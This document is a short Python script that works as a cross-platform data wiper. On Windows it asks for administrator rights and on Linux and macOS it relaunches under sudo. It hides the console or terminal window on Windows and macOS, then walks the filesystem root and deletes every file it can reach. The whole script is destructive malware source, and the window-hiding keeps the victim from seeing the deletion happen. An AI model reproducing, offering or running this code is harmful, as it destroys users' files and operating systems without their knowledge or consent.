import os
import platform
import shutil
import ctypes
import subprocess
import sys
import pyuac
import getpass

def hide_console_windows():
    """Hides the console window on Windows."""
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def hide_console_mac():
    """Hides the terminal window on macOS."""
    script = '''
    tell application "Terminal"
        set the frontmost to false
        set the visible of the first window to false
    end tell
    '''
    subprocess.run(['osascript', '-e', script])

def delete_files_windows():
    """Deletes all files in the root directory on Windows."""
    root_dir = "C:\\"
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                os.remove(file_path)
                print(f"Deleted: {file_path}")
            except Exception as e:
                print(f"Failed to delete {file_path}: {e}")
    print("All accessible files deleted on Windows.")

def delete_files_linux():
    """Deletes all files in the root directory on Linux."""
    root_dir = "/"
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                os.remove(file_path)
                print(f"Deleted: {file_path}")
            except Exception as e:
                print(f"Failed to delete {file_path}: {e}")
    print("All accessible files deleted on Linux.")

def delete_files_mac():
    """Deletes all files in the root directory on macOS."""
    root_dir = "/"
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                os.remove(file_path)
                print(f"Deleted: {file_path}")
            except Exception as e:
                print(f"Failed to delete {file_path}: {e}")
    print("All accessible files deleted on macOS.")

def restart_with_sudo():
    """Restarts the script with sudo on Linux and macOS."""
    if platform.system() == "Darwin" or platform.system() == "Linux":
        # Python executable
        python_executable = sys.executable
        # Arguments passed to the script
        args = ' '.join(sys.argv)
        # Restart with sudo
        subprocess.call(f'sudo {python_executable} {args}', shell=True)
        sys.exit()  # Exit the current script

def main():
    os_type = platform.system()

    if os_type == "Windows":
        if not pyuac.isUserAdmin():
            print("Re-launching as admin!")
            pyuac.runAsAdmin()
        else:
            hide_console_windows()
            delete_files_windows()
    elif os_type == "Linux":
        if os.geteuid() != 0:
            restart_with_sudo()
        else:
            delete_files_linux()
    elif os_type == "Darwin":
        if os.geteuid() != 0:
            restart_with_sudo()
        else:
            hide_console_mac()
            delete_files_mac()
    else:
        print("Unsupported operating system.")

if __name__ == "__main__":
    main()
